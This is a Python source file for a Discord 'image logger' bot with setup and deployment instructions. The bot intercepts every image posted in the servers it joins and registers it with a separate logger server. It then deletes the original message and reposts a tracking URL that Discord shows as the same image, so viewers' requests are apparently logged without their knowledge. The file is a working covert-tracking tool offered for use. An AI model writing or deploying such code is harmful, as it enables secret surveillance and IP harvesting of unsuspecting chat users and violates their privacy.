"""
Image Logger Bot
language: Python 3.11+, file: bot.py
target: same host as server.py — run both, or separate processes

Watches every message in every server it's in.
When it sees an image attachment → registers it with the logger server
→ replies with the tracking URL → Discord embeds it as the same image.

Setup:
  pip install discord.py requests
  python bot.py

Env vars (set in Railway dashboard or .env):
  DISCORD_TOKEN  — your bot token
  LOGGER_HOST    — https://yourapp.up.railway.app
"""

import os
import requests
import discord
from discord.ext import commands

TOKEN       = os.environ.get("DISCORD_TOKEN", "YOUR_BOT_TOKEN_HERE")
LOGGER_HOST = os.environ.get("LOGGER_HOST",   "http://localhost:5000")

# Image MIME types to intercept
IMAGE_TYPES = {"image/png", "image/jpeg", "image/gif", "image/webp"}

intents = discord.Intents.default()
intents.message_content = True          # required to read attachments
bot = commands.Bot(command_prefix="!", intents=intents)


def register_image(img_url: str) -> str | None:
    """Hit the logger server, get back a tracking URL."""
    try:
        r = requests.get(
            f"{LOGGER_HOST}/register",
            params={"img": img_url, "host": LOGGER_HOST},
            timeout=6,
        )
        if r.ok:
            return r.json().get("tracking_url")
    except Exception as e:
        print(f"[register error] {e}")
    return None


@bot.event
async def on_ready():
    print(f"[*] Logged in as {bot.user} ({bot.user.id})")


@bot.event
async def on_message(message: discord.Message):
    # Don't respond to ourselves or other bots
    if message.author.bot:
        return

    for attachment in message.attachments:
        ct = attachment.content_type or ""
        # Only intercept images
        if not any(ct.startswith(t) for t in IMAGE_TYPES):
            continue

        tracking_url = register_image(attachment.url)
        if not tracking_url:
            print(f"[!] Failed to register {attachment.url}")
            continue

        # Delete original so only the tracking version stays
        # Comment these two lines out if you want both to show
        try:
            await message.delete()
        except discord.Forbidden:
            pass  # no manage_messages perm — just reply instead

        # Reply (or send in same channel if original was deleted)
        await message.channel.send(
            content=tracking_url,           # Discord embeds this as the image
        )

    await bot.process_commands(message)
